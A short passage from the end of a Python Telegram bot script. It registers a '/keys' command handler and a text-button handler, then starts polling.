    application.add_handler(CommandHandler("keys", show_keys))
    
    # Add button handler
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))

    application.run_polling()

if __name__ == '__main__':
    main()